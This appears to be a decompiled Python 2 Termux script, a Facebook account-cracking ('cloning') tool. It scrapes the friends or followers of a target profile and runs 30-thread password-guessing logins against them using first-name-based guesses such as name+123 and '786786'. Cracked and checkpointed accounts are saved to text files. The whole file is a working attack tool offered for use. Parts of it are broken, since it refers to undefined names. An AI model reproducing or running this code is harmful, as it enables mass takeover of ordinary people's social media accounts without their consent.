# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: dg
import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
__author__ = 'RANA'
__copyright = 'All rights reserved . Copyright  RANA'
os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 
   'x-fb-connection-quality': 'EXCELLENT', 
   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
   'content-type': 'application/x-www-form-urlencoded', 
   'x-fb-http-engine': 'Liger'}
os.system('git pull')
os.system('clear')

def reg():
    os.system('clear')
    print logo
    print ''
    print '\x1b[0;32;40mENJOY FREE CLONING'
    print ''
    time.sleep(1)
    os.system
    print logo
    print '\tCOLLECTING DEVICE INFO'
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print '\x1b[0;32;40m YOUR IP: ' + ips
    time.sleep(1)
    print '\x1b[0;32;40m YOUR COUNTRY: ' + country
    time.sleep(1)
    print '\x1b[0;32;40m YOUR REGION: ' + regi
    time.sleep(1)
    print ' \x1b[0;32;40mYOUR NETWORK: ' + network
    time.sleep(1)
    print ' Loading ...'
    time.sleep(1)
    log_menu()

logo = """

\033[1;92m_________________________________________________

      
\033[1;94m db    db d8888b.  .d8b.  d888888b d8888b.  .d88b.  
\033[1;95m 88    88 88  `8D d8' `8b   `88'   88  `8D .8P  Y8. 
\033[1;92m 88    88 88oooY' 88ooo88    88    88   88 88    88 
\033[1;93m 88    88 88~~~b. 88~~~88    88    88   88 88    88 
\033[1;97m 88b  d88 88   8D 88   88   .88.   88  .8D `8b  d8' 
\033[1;96m ~Y8888P' Y8888P' YP   YP Y888888P Y8888D'  `Y88P'  
                                                    
                                                    
\033[1;94m  .d8b.  db   db .88b  d88.  .d8b.  d8888b.  .d88b.  
\033[1;95md8' `8b 88   88 88'YbdP`88 d8' `8b 88  `8D .8P  Y8. 
\033[1;92m 88ooo88 88ooo88 88  88  88 88ooo88 88   88 88    88 
\033[1;93m 88~~~88 88~~~88 88  88  88 88~~~88 88   88 88    88 
\033[1;97m 88   88 88   88 88  88  88 88   88 88  .8D `8b  d8' 
\033[1;96m YP   YP YP   YP YP  YP  YP YP   YP Y8888D'  `Y88P'  
                                                     
                                                     

          

\033[1;92m------------------------------------------------

     \033[1;92m>> Author = UBAIDO
     \033[1;92m>> FACEBOOK = UBAID ULLAH
     \033[1;92m>> WHATTSAPP= +971 50 965 3974

\033[1;92m------------------------------------------------"""

def main():

	os.system("clear")

	print(logo)

	print("")

	print(" \x1b[1;92m    \tMain menu")
	print("")
	print(" \x1b[1;92m     [1] START CLONING\n")
	print("")
	os.system('xdg-open https://www.facebook.com/UBaido.Trick.master')

	log_sel()

def log_sel():

	select = raw_input("\033[1;92mChoose option: \033[0;93m")

	if select =="1":

		login()

   

	else:

		print("")

		print("\tSelect valid option")

		print("")

		log_select()

def login():

	try:

		token = open("access_token.txt", "r").read()

		menu()

	except(KeyError , IOError):

		os.system("clear")

		print(logo)

		print("")

		print(" \x1b[1;92m  \tFacebook login")
		print("")
		print(47*"-")

		print(" \x1b[1;92m   [1] FACEBOOK ID/PASS LOGIN\n")
		print(" \x1b[1;92m   [2] FACEBOOK TOKEN LOGIN\n")
		print("  \x1b[1;92m  [3] Back ")

		print(47*"-")

		print("")

		log_select()

def log_select():

	sel = raw_input(" Choose an option: ")

	if sel =="1":

		log_fb()

	elif sel =="2":

		token()

	elif sel =="3":

		ran()

	else:

		print("")

		print("\tSelect valid option")

		print("")

		log_select()

def log_fb():

	os.system("clear")

	try:

		token = open("access_token.txt", "r").read()

		menu()

	except (KeyError , IOError):

		print(logo)

		print("")

		print("\tFacebook id/pass login")

		print("")

		uid = raw_input(" Uid: ")

		passw = raw_input(" Password: ")

		data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+passw+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true", headers=header).text

		q = json.loads(data)

		if "access_token" in q:

			sav = open("access_token.txt", "w")

			sav.write(q["access_token"])

			sav.close()

			menu()

		elif "www.facebook.com" in q["error"]:

			print("")

			print("\tAccount has checkpoint")

			print("")

			time.sleep(1)

			login()

		else:

			print("")

			print("\tId/pass my be wrong")

			print("")

			time.sleep(1)

def token():

    os.system("clear")

    try:

        token = open("access_token.txt", "r").read()

        menu()

    except(KeyError , IOError):

        print(logo)

        print("")

        print(" \x1b[1;92m  \tLogin token")

        print("")

        token = raw_input        (" Paste token here: ")

        sav = open("access_token.txt", "w")

        sav.write(token)

        sav.close()

        login()

def menu():

    os.system("clear")

    try:

        token = open("access_token.txt", "r").read()

    except(KeyError , IOError):

        login()

    try:

        r = requests.get("https://graph.facebook.com/me?access_token="+token)

        q = json.loads(r.text)

        name = q["name"]

    except(KeyError):

        print(logo)

        print("")

        print("\tLogged in token has expired")

        os.system("rm -rf access_token.txt")

        print("")

        time.sleep(1)

        login()

    os.system("clear")

    print(logo)

    print("")

    print("   Welcome: "+name)
    print("")
    print("    Free mode :Actvited")
    print("")
    print(47*"-")
    print("")
    print(" \x1b[1;92m[1] CRACK AUTO PASS\n")
    print(" \x1b[1;92m[2] CRACK CHOICE PASS\n")
    print(' \x1b[1;92m[3] BACK')

    print(47*"-")

    print("")

    menu_option()

def menu_option():

	select = raw_input("\033[1;92mChoose option: \033[0;93m")

	if select =="1":

		crack()

	elif select =="2":

		choice()

		

	else:

		print("")

		print("\tSelect valid option")

		print("")

		menu_option()

def crack():

	global token

	os.system("clear")

	try:

		token = open("access_token.txt","r").read()

	except IOError:

		print("")

		print("\tToken not found ")

		time.sleep(1)

		login_choice()

	os.system("clear")

	print(logo)

	print("")

	print("\t    \033[1;32mAUTO PASS CLONING\033[0;97m")

	print("")
	print(47*"-")
	print("\x1b[1;92m       [1] CRACK PUBLIC ID")
	print("\x1b[1;92m       [2] CRACK FOLLOWERS")
	print(" \x1b[1;92m      [0] BACK")
	print(47*"-")

	print("")

	crack_select()

def crack_select():

	select = raw_input("\033[1;33mChoose option: \033[0;97m")

	id=[]

	oks=[]

	cps=[]

	if select =="1":

		os.system("clear")

		print(logo)

		print("")

		print("\t    \033[1;32mAUTO PASS PUBLIC CRACK\033[0;97m")
		print("")
		idt = raw_input("  Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)

			q = json.loads(r.text)

			os.system('clear')

			print(logo)

			print('')

			print("\tAuto pass cracking")
			print('')
			print("  Cloning from : "+q["name"])
		except KeyError:
			print("\tInvalid link OR token")

			print("")

			raw_input(" Press enter to back")

			crack()

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)

		z = json.loads(r.text)

		for i in z["data"]:

			uid = i["id"]

			na = i["name"]

			nm = na.rsplit(" ")[0]

			id.append(uid+"|"+nm)

	elif select =="2":

		os.system("clear")

		print(logo)

		print("")

		print("\tAuto pass cracking")

		print("")

		idt = raw_input("  Input id: ")

		try:

			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)

			q = json.loads(r.text)

			os.system('clear')

			print(logo)

			print('')

			print('\tAuto pass cracking')

			print('')

			print("  Cloning from: "+q["name"])

		except KeyError:

			print("\tInvalid id link OR token")

			print("")

			raw_input(" Press enter to back")

			crack()

		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")

		z = json.loads(r.text)

		for i in z["data"]:

			uid = i["id"]

			na = i["name"]

			nm = na.rsplit(" ")[0]

			id.append(uid+"|"+nm)

	elif select =="0":

	    menu()

	else:

		print("")

		print("\tSelect valid option")

		print("")

		crack_select()

	print("  Total IDs : "+str(len(id)))

	print("  The Process has started")

	print("     UBAIDO and AHMADO  ")

	print(" \x1b[1;92m Press ctrl + z to stop")

	print(47*"-")

	print("")

	def main(arg):

		user=arg

		uid,name=user.split("|")

		ranagent = random.choice(agents)

		biran = random.choice(birth)

		session = requests.Session()

		session.headers.update({'User-Agent': ranagent})

		try:

			pass1 = name.lower()+"123"

			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

			q = json.loads(data)

			if "access_token" in q:

				print(" \033[1;32m [UBAID-OK] "+uid+" | "+pass1+"\033[0;97m")

				ok = open("ok.txt", "a")

				ok.write(uid+"|"+pass1+"\n")

				ok.close()

				oks.append(uid+pass1)

			else:

				if "www.facebook.com" in q["error_msg"]:

					print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass1+"\033[0;97m")

					cp = open("cp.txt", "a")

					cp.write(uid+"|"+pass1+"\n")

					cp.close()

					cps.append(uid+pass1)

				else:

					pass2 = name.lower()+"1234"

					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

					q = json.loads(data)

					if "access_token" in q:

						print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass2+"\033[0;97m")

						ok = open("ok.txt", "a")

						ok.write(uid+"|"+pass2+"\n")

						ok.close()

						oks.append(uid+pass2)

					else:

						if "www.facebook.com" in q["error_msg"]:

							print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass2+"\033[0;97m")

							cp = open("cp.txt", "a")

							cp.write(uid+"|"+pass2+"\n")

							cp.close()

							cps.append(uid+pass2)

						else:

							pass3 = name.lower()+"12345"

							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

							q = json.loads(data)

							if "access_token" in q:

								print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass3+"\033[0;97m")

								ok = open("ok.txt", "a")

								ok.write(uid+"|"+pass3+"\n")

								ok.close()

								oks.append(uid+pass3)

							else:

								if "www.facebook.com" in q["error_msg"]:

									print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass3+"\033[0;97m")

									cp = open("cp.txt", "a")

									cp.write(uid+"|"+pass3+"\n")

									cp.close()

									cps.append(uid+pass3)

								else:

									pass4 = name.lower()+"786"

									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

									q = json.loads(data)

									if "access_token" in q:

										print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass4+"\033[0;97m")

										ok = open("ok.txt", "a")

										ok.write(uid+"|"+pass4+"\n")

										ok.close()

										oks.append(uid+pass4)

									else:

										if "www.facebook.com" in q["error_msg"]:

											print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass4+"\033[0;97m")

											cp = open("cp.txt", "a")

											cp.write(uid+"|"+pass4+"\n")

											cp.close()

											cps.append(uid+pass4)

										else:

											pass5 = name.lower()+'1122'

											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

											q = json.loads(data)

											if "access_token" in q:

												print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass5+"\033[0;97m")

												ok = open("ok.txt", "a")

												ok.write(uid+"|"+pass5+"\n")

												ok.close()

												oks.append(uid+pass5)

											else:

												if "www.facebook.com" in q["error_msg"]:

													print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass5+"\033[0;97m")

													cp = open("cp.txt", "a")

													cp.write(uid+"|"+pass5+"\n")

													cp.close()

													cps.append(uid+pass5)

												else:

													pass6 = "pakistan"

													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

													q = json.loads(data)

													if "access_token" in q:

														print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass6+"\033[0;97m")

														ok = open("ok.txt", "a")

														ok.write(uid+"|"+pass6+"\n")

														ok.close()

														oks.append(uid+pass6)

													else:

														if "www.facebook.com" in q["error_msg"]:

															print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass6+"\033[0;97m")

															cp = open("cp.txt", "a")

															cp.write(uid+"|"+pass6+"\n")

															cp.close()

															cps.append(uid+pass6)

														else:

															pass7 = "786786"

															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

															q = json.loads(data)

															if "access_token" in q:

																print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass7+"\033[0;97m")

																ok = open("ok.txt", "a")

																ok.write(uid+"|"+pass7+"\n")

																ok.close()

																oks.append(uid+pass7)

															else:

																if "www.facebook.com" in q["error_msg"]:

																	print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass7+"\033[0;97m")

																	cp = open("cp.txt", "a")

																	cp.write(uid+"|"+pass7+"\n")

																	cp.close()

																	cps.append(uid+pass7)

		except:

			pass

	p = ThreadPool(30)

	p.map(main, id)

	print("")

	print("")

	print(47*"-")

	print("   \x1b[1;92mThe process has been completed")

	print("   \x1b[1;92m Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))

	print(47*"-")

	print("")

	print("")

	raw_input(" \x1b[1;92m Press enter to back ")

	menu()

def choice():

	global token

	os.system("clear")

	try:

		token = open("access_token.txt","r").read()

	except IOError:

		print("")

		print("\tToken not found")

		time.sleep(1)

		login_choice()

	os.system("clear")

	print(logo)

	print("")

	print("\t    \033[1;32mCHOICE PASS CRACK MENU\033[0;97m")

	print("")
	print(47*"-")
	print("\x1b[1;92m       [1] CRACK PUBLIC ID")
	print("\x1b[1;92m       [2] CRACK FOLLOWERS")
	print(" \x1b[1;92m      [0] BACK")

	print(47*"-")

	print("")

	choice_select()

def choice_select():

	select = raw_input("\033[1;32mChoose option: \033[0;97m")

	id=[]

	oks=[]

	cps=[]

	if select =="1":

		os.system("clear")

		print(logo)

		print("")

		print("\t    \033[1;32mCHOICE PASS PUBLIC CRACK\033[0;97m")

		print("")

		pass1 = raw_input(" Password: ")

		pass2 = raw_input(" Password: ")

		pass3 = raw_input(" Password: ")

		pass4 = raw_input(" Password: ")

		pass5 = raw_input(" Password: ")

		pass6 = raw_input(" Password: ")

		pass7 = raw_input(" Password: ")

		idt = raw_input(" Input id: ")

		try:

			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)

			q = json.loads(r.text)

			print(" Cloning from : "+q["name"])

		except KeyError:

			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")

			print("")

			raw_input(" Press enter to back")

			choice()

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)

		z = json.loads(r.text)

		for i in z["data"]:

			uid = i["id"]

			na = i["name"]

			nm = na.rsplit(" ")[0]

			id.append(uid+"|"+nm)

	elif select =="2":

		os.system("clear")

		print(logo)

		print("")

		print("\t    \033[1;32mAUTO PASS CRACK FOLLOWERS\033[0;97m")

		print("")

		pass1 = raw_input(" Password: ")

		pass2 = raw_input(" Password: ")

		pass3 = raw_input(" Password: ")

		pass4 = raw_input(" Password: ")

		pass5 = raw_input(" Password: ")

		pass6 = raw_input(" Password: ")

		pass7 = raw_input(" Password: ")

		idt = raw_input(" Input id: ")

		try:

			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)

			q = json.loads(r.text)

			os.system('clear')

			print(logo)

			print('')

			print('\Choice pass cracking')

			print('')

			print(" Cloning from: "+q["name"])

		except KeyError:

			print("\tInvalid id link")

			print("")

			raw_input(" Press enter to back")

			choice()

		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")

		z = json.loads(r.text)

		for i in z["data"]:

			uid = i["id"]

			na = i["name"]

			nm = na.rsplit(" ")[0]

			id.append(uid+"|"+nm)

	elif select =="0":

	    menu()

	else:

		print("")

		print("\tSelect valid option\033[0;97m")

		print("")

		choice_select()

	print(" \x1b[1;92m Total IDs : "+str(len(id)))

	print(" \x1b[1;92m The Process has started")

	print(" \x1b[1;92m Press ctrl + z to stop")

	print(47*"-")

	print("")

	def main(arg):

		user=arg

		uid,name=user.split("|")

		ranagent = random.choice(agents)

		session = requests.Session()

		session.headers.update({'User-Agent': ranagent})

		try:

			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

			q = json.loads(data)

			if "access_token" in q:

				print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass1+"\033[0;97m")

				ok = open("ok.txt", "a")

				ok.write(uid+"|"+pass1+"\n")

				ok.close()

				oks.append(uid+pass1)

			else:

				if "www.facebook.com" in q["error_msg"]:

					print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass1+"\033[0;97m")

					cp = open("cp.txt", "a")

					cp.write(uid+"|"+pass1+"\n")

					cp.close()

					cps.append(uid+pass1)

				else:

					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

					q = json.loads(data)

					if "access_token" in q:

						print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass2+"\033[0;97m")

						ok = open("ok.txt", "a")

						ok.write(uid+"|"+pass2+"\n")

						ok.close()

						oks.append(uid+pass2)

					else:

						if "www.facebook.com" in q["error_msg"]:

							print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass2+"\033[0;97m")

							cp = open("cp.txt", "a")

							cp.write(uid+"|"+pass2+"\n")

							cp.close()

							cps.append(uid+pass2)

						else:

							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

							q = json.loads(data)

							if "access_token" in q:

								print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass3+"\033[0;97m")

								ok = open("ok.txt", "a")

								ok.write(uid+"|"+pass3+"\n")

								ok.close()

								oks.append(uid+pass3)

							else:

								if "www.facebook.com" in q["error_msg"]:

									print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass3+"\033[0;97m")

									cp = open("UBAIDcp.txt", "a")

									cp.write(uid+"|"+pass3+"\n")

									cp.close()

									cps.append(uid+pass3)

								else:

									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

									q = json.loads(data)

									if "access_token" in q:

										print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass4+"\033[0;97m")

										ok = open("UBIADok.txt", "a")

										ok.write(uid+"|"+pass4+"\n")

										ok.close()

										oks.append(uid+pass4)

									else:

										if "www.facebook.com" in q["error_msg"]:

											print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass4+"\033[0;97m")

											cp = open("UBAIDcp.txt", "a")

											cp.write(uid+"|"+pass4+"\n")

											cp.close()

											cps.append(uid+pass4)

										else:

											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

											q = json.loads(data)

											if "access_token" in q:

												print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass5+"\033[0;97m")

												ok = open("UBAIDok.txt", "a")

												ok.write(uid+"|"+pass5+"\n")

												ok.close()

												oks.append(uid+pass5)

											else:

												if "www.facebook.com" in q["error_msg"]:

													print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass5+"\033[0;97m")

													cp = open("UBIADcp.txt", "a")

													cp.write(uid+"|"+pass5+"\n")

													cp.close()

													cps.append(uid+pass5)

												else:

													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

													q = json.loads(data)

													if "access_token" in q:

														print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass6+"\033[0;97m")

														ok = open("UBIADok.txt", "a")

														ok.write(uid+"|"+pass6+"\n")

														ok.close()

														oks.append(uid+pass6)

													else:

														if "www.facebook.com" in q["error_msg"]:

															print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass6+"\033[0;97m")

															cp = open("UBIADcp.txt", "a")

															cp.write(uid+"|"+pass6+"\n")

															cp.close()

															cps.append(uid+pass6)

														else:

															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

															q = json.loads(data)

															if "access_token" in q:

																print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass7+"\033[0;97m")

																ok = open("Abdullahok.txt", "a")

																ok.write(uid+"|"+pass7+"\n")

																ok.close()

																oks.append(uid+pass7)

															else:

																if "www.facebook.com" in q["error_msg"]:

																	print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass7+"\033[0;97m")

																	cp = open("Abdullahcp.txt", "a")

																	cp.write(uid+"|"+pass7+"\n")

																	cp.close()

																	cps.append(uid+pass7)

		except:

			pass

	p = ThreadPool(30)

	p.map(main, id)

	print("")

	print("")

	print(47*"-")

	print(" \x1b[1;92m  The process has been completed")

	print(" \x1b[1;92m   Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))

	print(47*"-")

	print("")

	print("")

	raw_input(" \x1b[1;92m Press enter to back ")

	main()

	

	

if __name__ == '__main__':

	main()
